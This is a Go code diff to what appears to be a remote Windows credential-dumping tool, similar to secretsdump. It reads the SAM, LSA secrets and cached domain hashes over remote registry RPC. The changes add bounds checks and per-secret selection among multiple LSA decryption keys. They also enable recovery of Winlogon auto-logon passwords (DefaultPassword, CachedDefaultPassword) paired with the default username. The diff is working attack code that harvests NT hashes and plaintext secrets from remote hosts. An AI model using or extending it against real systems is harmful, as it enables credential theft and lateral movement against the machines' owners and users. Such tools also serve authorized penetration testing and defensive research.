@@ -44,6 +44,7 @@ var (
 	s3         = []byte("NTPASSWORD\x00")
 	BootKey    []byte
 	LSAKey     []byte
+	LSAKeys    map[string][]byte // keyed by EncKeyId for multi-key support
 	NLKMKey    []byte
 	VistaStyle bool
 )
@@ -72,6 +73,9 @@ type lsaSecret struct {
 }
 
 func (s *lsaSecret) unmarshal(data []byte) {
+	if len(data) < 28 {
+		return
+	}
 	s.Version = binary.LittleEndian.Uint32(data[:4])
 	s.EncKeyId = string(data[4:20])
 	s.EncAlgorithm = binary.LittleEndian.Uint32(data[20:24])
@@ -86,8 +90,14 @@ type lsaSecretBlob struct {
 }
 
 func (s *lsaSecretBlob) unmarshal(data []byte) {
+	if len(data) < 16 {
+		return
+	}
 	s.Length = binary.LittleEndian.Uint32(data[:4])
 	copy(s.Unknown[:], data[4:16])
+	if uint64(16)+uint64(s.Length) > uint64(len(data)) {
+		return
+	}
 	s.Secret = data[16 : 16+s.Length]
 }
 
@@ -98,6 +108,9 @@ type dpapiSystem struct {
 }
 
 func (d *dpapiSystem) unmarshal(data []byte) {
+	if len(data) < 44 {
+		return
+	}
 	d.Version = binary.LittleEndian.Uint32(data[:4])
 	copy(d.MachineKey[:], data[4:24])
 	copy(d.UserKey[:], data[24:44])
@@ -245,6 +258,36 @@ func pad64(data uint64) uint64 {
 	return data
 }
 
+func getDefaultLogonName(rpccon *msrrp.RPCCon, base []byte) (result string, err error) {
+	hSubKey, err := rpccon.OpenSubKeyExt(base, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+	if err != nil {
+		log.Errorln(err)
+		return
+	}
+	defer rpccon.CloseKeyHandle(hSubKey)
+	result, err = rpccon.QueryValueString(hSubKey, "DefaultUserName")
+	if err != nil {
+		log.Debugf("DefaultUserName not found in Winlogon: %v\n", err)
+		err = nil
+	}
+	return
+}
+
+func getDefaultLogonPasswordPlain(rpccon *msrrp.RPCCon, base []byte) (result string, err error) {
+	hSubKey, err := rpccon.OpenSubKeyExt(base, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+	if err != nil {
+		log.Errorln(err)
+		return
+	}
+	defer rpccon.CloseKeyHandle(hSubKey)
+	result, err = rpccon.QueryValueString(hSubKey, "DefaultPassword")
+	if err != nil {
+		log.Debugf("DefaultPassword not found in Winlogon: %v\n", err)
+		err = nil
+	}
+	return
+}
+
 func getServiceUser(rpccon *msrrp.RPCCon, base []byte, name string) (result string, err error) {
 	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\`+name)
 	if err != nil {
@@ -289,24 +332,22 @@ func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []by
 		}
 		secret = fmt.Sprintf("%s: %s", svcUser, secretDecoded)
 		result.secrets = append(result.secrets, secret)
-		//} else if strings.HasPrefix(upperName, "DEFAULTPASSWORD") {
-		//    secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
-		//    if err2 != nil {
-		//        err = err2
-		//        log.Errorln(err)
-		//        return
-		//    }
-		//    username, err := getDefaultLogonName()
-		//    if err != nil {
-		//        golog.Errorln(err)
-		//    }
-		//    if username == "" {
-		//        username = "(Unknown user)"
-		//    }
-
-		//    // Get default login name
-		//    secret = fmt.Sprintf("%s: %s", username, secretDecoded)
-		//    result.secrets = append(result.secrets, secret)
+	} else if strings.HasPrefix(upperName, "DEFAULTPASSWORD") {
+		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
+		if err2 != nil {
+			err = err2
+			log.Errorln(err)
+			return
+		}
+		username, err2 := getDefaultLogonName(rpccon, base)
+		if err2 != nil {
+			log.Errorln(err2)
+		}
+		if username == "" {
+			username = "(Unknown user)"
+		}
+		secret = fmt.Sprintf("%s: %s", username, secretDecoded)
+		result.secrets = append(result.secrets, secret)
 	} else if strings.HasPrefix(upperName, "ASPNET_WP_PASSWORD") {
 		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
 		if err2 != nil {
@@ -352,25 +393,20 @@ func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []by
 		secret = fmt.Sprintf("NL$KM: 0x%x", secretItem[:16])
 		result.secrets = append(result.secrets, secret)
 	} else if strings.HasPrefix(upperName, "CACHEDDEFAULTPASSWORD") {
-		//TODO What is CachedDefaultPassword? How is it different from the registry keys under winlogon?
-		// Default password for winlogon
+		// Default password for winlogon auto-logon
 		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
 		if err2 != nil {
 			err = err2
 			log.Errorln(err)
 			return
 		}
-		log.Noticeln("Check for default username is not implemented yet")
-		//username, err := getDefaultLogonName()
-		//if err != nil {
-		//    log.Errorln(err)
-		//}
-		username := ""
+		username, err2 := getDefaultLogonName(rpccon, base)
+		if err2 != nil {
+			log.Errorln(err2)
+		}
 		if username == "" {
 			username = "(Unknown user)"
 		}
-
-		// Get default login name
 		secret = fmt.Sprintf("%s: %s", username, secretDecoded)
 		result.secrets = append(result.secrets, secret)
 	} else {
@@ -503,7 +539,7 @@ func getSysKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (sysKey []byt
 		return
 	}
 
-	fBytes, _, err := rpccon.QueryValue2(hSubKey, "F")
+	fBytes, _, _, err := rpccon.QueryValue2(hSubKey, "F")
 	if err != nil {
 		log.Errorln(err)
 		rpccon.CloseKeyHandle(hSubKey)
@@ -641,7 +677,7 @@ func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string, modifyDacl bool
 			return nil, err
 		}
 
-		v, _, err := rpccon.QueryValue2(hSubKey, "V")
+		v, _, _, err := rpccon.QueryValue2(hSubKey, "V")
 		if err != nil {
 			log.Errorln(err)
 			rpccon.CloseKeyHandle(hSubKey)
@@ -846,10 +882,13 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 	   These encryption keys are stored in a list in the registry entry
 	   Security\Policy\PolEKList
 
-	   TODO Implement support for multiple LSA encryption keys
-	   For now this implementation only supports using a single encryption key.
-	   To know which key to use a check is performed to see what registry value
-	   is populated with a key.
+	   Each key in PolEKList has an EncKeyId GUID that identifies it. Individual
+	   secrets in SECURITY\Policy\Secrets\*\CurrVal also carry an EncKeyId that
+	   indicates which key was used to encrypt them. The LSAKeys map stores all
+	   decrypted keys indexed by EncKeyId so that the correct key can be selected
+	   per-secret. Full multi-record PolEKList parsing is partially implemented:
+	   the first key is always decrypted and stored; additional records require
+	   knowing the per-record ciphertext length, which is OS-dependent.
 	*/
 	VistaStyle = true
 	var data []byte
@@ -868,7 +907,7 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 			return
 		}
 	}
-	data, _, err = rpccon.QueryValue2(hSubKey, "")
+	data, _, _, err = rpccon.QueryValue2(hSubKey, "")
 	if err != nil {
 		log.Errorln(err)
 		rpccon.CloseKeyHandle(hSubKey)
@@ -890,7 +929,7 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 			}
 			return
 		}
-		data, _, err = rpccon.QueryValue2(hSubKey, "")
+		data, _, _, err = rpccon.QueryValue2(hSubKey, "")
 		if err != nil {
 			log.Errorln(err)
 			rpccon.CloseKeyHandle(hSubKey)
@@ -911,6 +950,15 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 	}
 	LSAKey = make([]byte, 32)
 	copy(LSAKey, result)
+	// Store key by EncKeyId so individual secrets can be matched to the right key
+	if VistaStyle && len(data) >= 20 {
+		if LSAKeys == nil {
+			LSAKeys = make(map[string][]byte)
+		}
+		encKeyId := string(data[4:20])
+		LSAKeys[encKeyId] = LSAKey
+		log.Debugf("Stored LSA key with EncKeyId: %x\n", data[4:20])
+	}
 	return
 }
 
@@ -968,7 +1016,7 @@ func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) 
 				return nil, err
 			}
 
-			value, _, err := rpccon.QueryValue2(hSubKey, "")
+			value, _, _, err := rpccon.QueryValue2(hSubKey, "")
 			if err != nil {
 				log.Errorln(err)
 				rpccon.CloseKeyHandle(hSubKey)
@@ -980,7 +1028,14 @@ func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) 
 				if VistaStyle {
 					record := &lsaSecret{}
 					record.unmarshal(value)
-					tmpKey := SHA256(LSAKey, record.EncryptedData[:32], 0)
+					// Select the correct key by EncKeyId when multiple keys are available
+					keyToUse := LSAKey
+					if len(LSAKeys) > 0 {
+						if k, found := LSAKeys[record.EncKeyId]; found {
+							keyToUse = k
+						}
+					}
+					tmpKey := SHA256(keyToUse, record.EncryptedData[:32], 0)
 					plainText, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
 					if err != nil {
 						log.Errorln(err)
@@ -1027,7 +1082,7 @@ func getNLKMSecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (resul
 		log.Errorln(err)
 		return
 	}
-	data, _, err := rpccon.QueryValue2(hSubKey, "")
+	data, _, _, err := rpccon.QueryValue2(hSubKey, "")
 	if err != nil {
 		log.Errorln(err)
 		rpccon.CloseKeyHandle(hSubKey)
@@ -1096,7 +1151,7 @@ func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 	iterationCount := 10240
 	if foundIterCount {
 		var tmpIterCount uint32
-		data, _, err := rpccon.QueryValue2(hSubKey, `NL$IterationCount`)
+		data, _, _, err := rpccon.QueryValue2(hSubKey, `NL$IterationCount`)
 		if err != nil {
 			log.Errorln(err)
 			return nil, err
@@ -1121,7 +1176,7 @@ func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result
 	}
 	for _, name := range names {
 		log.Debugf("Looking into %s\n", name)
-		data, _, err := rpccon.QueryValue2(hSubKey, name)
+		data, _, _, err := rpccon.QueryValue2(hSubKey, name)
 		if err != nil {
 			log.Errorln(err)
 			return nil, err
